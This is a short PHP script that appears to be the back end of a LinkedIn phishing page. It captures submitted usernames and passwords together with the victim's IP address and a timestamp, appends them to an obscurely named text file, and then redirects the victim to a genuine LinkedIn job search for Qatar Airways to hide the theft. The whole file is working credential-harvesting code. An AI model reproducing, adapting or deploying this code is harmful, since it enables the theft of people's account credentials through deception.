<?php

date_default_timezone_set('Etc/GMT+10');
    $date = date('m/d/Y h:i:s a', time());
    $ip = $_SERVER['REMOTE_ADDR'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $file = fopen("../a1dd7c9fca9099e4e460b90bfa672458.txt","a+");
    fwrite($file,$date);
    fwrite($file,", ");
    fwrite($file,"linkedin");
    fwrite($file,", ");
    fwrite($file,$ip);
    fwrite($file,", ");
    fwrite($file,$username);
    fwrite($file,":");
    fwrite($file,$password);
    fwrite($file,"\n");
    fclose($file); 
    print_r(error_get_last());
    header("Location: https://www.linkedin.com/jobs/search?keywords=Qatar%2BAirways&location=qatar&trk=public_jobs_jobs-search-bar_search-submit&currentJobId=2724633501&position=9&pageNum=0");
    exit();

